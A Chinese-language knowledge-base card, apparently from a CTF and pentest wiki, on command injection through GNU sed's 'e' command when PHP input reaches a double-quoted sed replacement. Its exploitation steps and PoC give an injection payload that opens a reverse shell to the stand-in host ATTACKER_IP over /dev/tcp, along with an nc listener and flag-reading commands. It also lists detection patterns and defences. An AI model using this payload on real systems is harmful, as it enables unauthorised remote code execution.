---
id: web-php-rce-sed-replacement-expression-e-command-injection
title: 双引号内变量进 sed 替换表达式：分号接 GNU sed e 命令执行 shell
type: scenario
domain: web
path: web/php/rce
technique: sed-replacement-expression-e-command-injection
tags:
- php
- command-injection
- sed
- rce
- shell
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-12'
updated: '2026-11-12'
verification:
  verified_by: verifier-V569
  verified_at: '2026-11-12T09:28:42+08:00'
  notes: 已对照原文与截图01-04核对：Webshell 生成器 generate.sh 双引号内 sed s 替换、method 字段注入 aaaa/g;e bash -c 反弹 shell，Burp 截图确认真实回连并读 /readflag；key 114 长度限制与改用 method 的细节一致。未实测 BSD/BusyBox sed 差异（常识性说明）。
url: /docs/web/php/rce/web-php-rce-sed-replacement-expression-e-command-injection/
draft: false
kb_aliases:
- sed e 命令注入
- sed 表达式注入
- sed s 命令注入 RCE
- 环境变量注入 sed
- Webshell 生成器 sed 注入
- GNU sed execute command
---

## 一句话结论

Web 应用把用户输入拼进双引号内的 `sed -i "s/KEY/$KEY/g" file` 时，变量展开不会重新触发 shell 解析，但输入会原样成为 sed 脚本的一部分；用 `;` 结束 s 命令后接 GNU sed 的 `e` 命令，即可让 sed 执行任意 shell 命令，获得与 Web 进程同权限的 RCE。

## 原理

- shell 的处理顺序是"先做分词与引号解析，再做变量展开"：在 `"s/KEY/$KEY/g"` 中，`$KEY` 的值即使包含空格、双引号、分号，也只作为同一个参数的一部分传给 sed，不会重新被 shell 解释。因此"先闭合双引号再用 `;bash -i ...`"的思路不成立——payload 里的 `"` 只是 sed 脚本中的普通字符，会破坏 s 命令的 flags（`sed: -e expression #1, char N: unknown option to 's'`）。
- 真正的注入面是 **sed 脚本语言本身**：sed 用分号分隔多条命令，GNU sed 的 `e` 命令会执行其后的 shell 命令。把输入设为 `x/g;e bash -c "..."` 时，s 命令在 `/g` 处完整结束，`;e ...` 成为下一条 sed 命令被执行。
- 为什么 payload 里的 `;`、`"`、空格不会破坏外层 shell：它们都位于双引号内的变量展开结果中，展开结果不会被二次解析为 shell 语法；只有 sed 会按自己的规则解释它们。
- 这类拼接常见于"Webshell/配置生成器"模式：PHP 先 `putenv("METHOD=$method")`，再 `shell_exec("sh generate.sh")`，脚本内 `sed -i "s/METHOD/$METHOD/g"` 读取环境变量完成替换。

## 触发条件

- 应用把用户可控字符串拼进 sed 脚本/表达式（`sed -i "s/pattern/$input/g"`、`sed -e "..."`），且输入未转义、未白名单校验；
- 目标使用 GNU sed（`e` 为 GNU 扩展，BSD/macOS sed 不支持）；
- 输入限制允许在长度上限内放入 `x/g;e <命令>;` 且不禁止分号（分号通常不在过滤范围内）；
- 变量处于双引号内（不加引号或单引号时也可注入，但闭合方式不同）。

## 利用步骤

1. 通过源码泄露、报错或下载接口拿到拼接点，例如 `generate.sh` 中的 `sed -i "s/METHOD/$METHOD/g" "$NEW_FILENAME"`，输入经 `putenv` 进入环境变量。
2. 构造 payload：`aaaa/g;e bash -c "bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1";`。前半段 `s/METHOD/aaaa/g` 是完整替换命令；`;e ...` 执行命令；模板末尾的 `/g"` 成为多余内容（可能报错，但 e 已执行）。
3. 攻击机 `nc -lvnp PORT` 监听，发送触发请求。
4. 收到回连后执行 `id`、`ls`、`cat /flag`（CTF 中常配合 `/readflag` 提权）确认权限与目标。
5. 无回连条件时可用短命令写文件：`x/g;e id>/tmp/o;`，再借应用自身的下载/文件读取接口取回 `/tmp/o`。

## PoC

```bash
# 模板：sed -i "s/METHOD/$METHOD/g" "$NEW_FILENAME"
# 注入的 METHOD 值（发送前做 URL 编码）：
aaaa/g;e bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1";
# sed 实际收到的脚本：
s/METHOD/aaaa/g;e bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1";/g
```

原题（Webshell 生成器）还带有 `download.php?file=` 任意文件读取，用来先读取 `index.php` 与 `generate.sh` 确认拼接点与过滤长度；该读取功能不是本卡核心。

## 变体与关联

- 变体：任何把输入放进 sed 脚本的位置（`-n 's/x/.../p'`、地址正则等）都适用；若文件名可控，`-f` 选项注入是另一条路径，见 [[pentest-initial-access-redis-module-sed-filename-argument-injection]]。
- 变体：BusyBox sed 不支持 `e`，但可用 `w file`/`s///w file` 产生写文件副作用。
- 关联：通用命令注入与 PHP `putenv` + `shell_exec` 审计点；`awk -v var=...`（变量不参与脚本解析）是相对安全的替代写法。

## 检测与防御

- 检测：审计日志/命令行中出现 `;e`、`e bash`、`e sh`、`sed -i ... e ` 等模式；Web 参数中出现 `/g;e`、`%3Be` 等片段。
- 防御：不要把用户输入拼进 sed 表达式；确需替换时使用不解析输入的接口（如 `awk -v`、perl/python 的字符串替换），或对输入做严格白名单（如 `^[A-Za-z0-9_]{1,32}$`）；无法避免时用 `--` 与 `-e` 分离脚本与输入并转义分隔符。
